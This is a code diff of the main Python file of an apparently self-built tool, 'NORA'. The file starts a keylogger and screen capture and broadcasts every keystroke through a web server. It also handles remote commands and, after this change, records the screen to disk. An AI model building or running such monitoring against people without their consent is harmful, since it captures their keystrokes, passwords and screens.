@@ -1,21 +1,18 @@
 import threading
-import sys
 import os
 
 import server
 import keylogger as kl
 import screencap as sc
 import controller
+import recorder as rec
 
 PORT = int(os.environ.get("NORA_PORT", 9090))
 
-_keylog_buffer = []
 _key_lock = threading.Lock()
 
 
 def on_key(char):
-    with _key_lock:
-        _keylog_buffer.append(char)
     server.broadcast_key(char)
 
 
@@ -24,15 +21,16 @@ def on_frame(b64):
 
 
 def main():
-    server.init(controller.handle_command)
+    recorder = rec.Recorder(output_dir="recordings", fps=10)
+    server.init(controller.handle_command, recorder)
 
     keylogger = kl.Keylogger(on_key)
     keylogger.start()
 
     capture = sc.ScreenCapture(on_frame, fps=12, quality=55, scale=0.6)
+    capture.attach_recorder(recorder)
     capture.start()
 
-    # Block on the web server (runs in this thread)
     server.run(port=PORT)
 
 
